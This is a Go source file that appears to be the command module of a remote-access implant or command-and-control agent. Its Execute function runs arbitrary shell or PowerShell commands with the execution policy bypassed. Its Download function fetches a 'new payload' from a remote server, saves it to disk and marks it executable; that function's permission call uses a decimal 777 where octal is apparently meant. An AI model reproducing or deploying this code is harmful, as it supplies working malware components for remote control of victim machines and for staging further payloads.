package commands

import (
	"fmt"
	"os"
	"runtime"
	"path/filepath"
	"net/http"
	"io"
	"os/exec"
	"strings"
 )

 //Execute runs an arbitrary terminal command
 func Execute(command string) []byte {
	var bites []byte
	var error error
	if runtime.GOOS == "windows" {
	   bites, error = exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-C", command).Output()
	} else {
	   bites, error = exec.Command("sh", "-c", command).Output()
    }
    if error != nil {
       bites = []byte(string(error.Error()))
	}
	return []byte(fmt.Sprintf("%s%s", bites, "\n"))
}

//ChangeDirectory switches working directory
func ChangeDirectory(target string) []byte {
	os.Chdir(strings.TrimSpace(target))
	return []byte(" ")
}

//Download a payload from the API
func Download(server string, file string) []byte {
	file = strings.TrimSpace(file)
	cwd, _ := os.Getwd()
	location := filepath.Join(cwd, file)
	
    if len(file) > 0 {
       fmt.Println(fmt.Sprintf("[*] Downloading new payload: %s", file))
       address := fmt.Sprintf("%s/file/download", server)
       req, _ := http.NewRequest("POST", address, nil)
       req.Header.Set("file", file)
	   req.Header.Set("platform", string(runtime.GOOS))
       client := &http.Client{}
       resp, err := client.Do(req)
       if err == nil {
          dst, _ := os.Create(location)
          defer dst.Close()
		  io.Copy(dst, resp.Body)
		  os.Chmod(location, 777)
       }
	}
	return []byte(" ")
}

